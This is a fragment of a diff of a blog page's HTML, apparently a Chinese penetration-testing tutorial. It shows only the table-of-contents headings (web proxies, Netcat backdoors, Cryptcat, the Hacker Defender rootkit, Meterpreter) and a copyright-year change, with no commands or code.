href="#3-WebScarab"><span class="nav-number">5.3.</span> <span class="nav-text">3. WebScarab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Zed-Attack-Proxy（ZAP）"><span class="nav-number">5.4.</span> <span class="nav-text">4. Zed Attack Proxy（ZAP）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-其他相关"><span class="nav-number">5.5.</span> <span class="nav-text">5. 其他相关</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六-维持访问"><span class="nav-number">6.</span> <span class="nav-text">六. 维持访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Netcat：瑞士军刀"><span class="nav-number">6.1.</span> <span class="nav-text">1. Netcat：瑞士军刀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）配置为连接两台计算机的通信通道"><span class="nav-number">6.1.1.</span> <span class="nav-text">1）配置为连接两台计算机的通信通道</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#保持连接持久性："><span class="nav-number">6.1.1.0.1.</span> <span class="nav-text">保持连接持久性：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）文件传输"><span class="nav-number">6.1.2.</span> <span class="nav-text">2）文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#上传-下载："><span class="nav-number">6.1.2.1.</span> <span class="nav-text">上传/下载：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3）识别端口服务"><span class="nav-number">6.1.3.</span> <span class="nav-text">3）识别端口服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4）绑定进程，配置后门"><span class="nav-number">6.1.4.</span> <span class="nav-text">4）绑定进程，配置后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Cryptcat"><span class="nav-number">6.2.</span> <span class="nav-text">2. Cryptcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Rootkit"><span class="nav-number">6.3.</span> <span class="nav-text">3. Rootkit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hacker-Defender（Windows-Rootkit）"><span class="nav-number">6.3.1.</span> <span class="nav-text">Hacker Defender（Windows Rootkit）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#三个主要文件："><span class="nav-number">6.3.1.1.</span> <span class="nav-text">三个主要文件：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hxdef100-ini："><span class="nav-number">6.3.1.2.</span> <span class="nav-text">hxdef100.ini：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#发现隐藏文件和Rootkit的工具："><span class="nav-number">6.3.1.3.</span> <span class="nav-text">发现隐藏文件和Rootkit的工具：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Meterpreter"><span class="nav-number">6.4.</span> <span class="nav-text">4. Meterpreter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤：-4"><span class="nav-number">6.4.1.</span> <span class="nav-text">步骤：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-其他"><span class="nav-number">6.5.</span> <span class="nav-text">5. 其他</span></a></li></ol></div>
             
 
           </div>
@@ -638,7 +867,7 @@ nslookup
         <div class="copyright">
   
   &copy;  2017 - 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
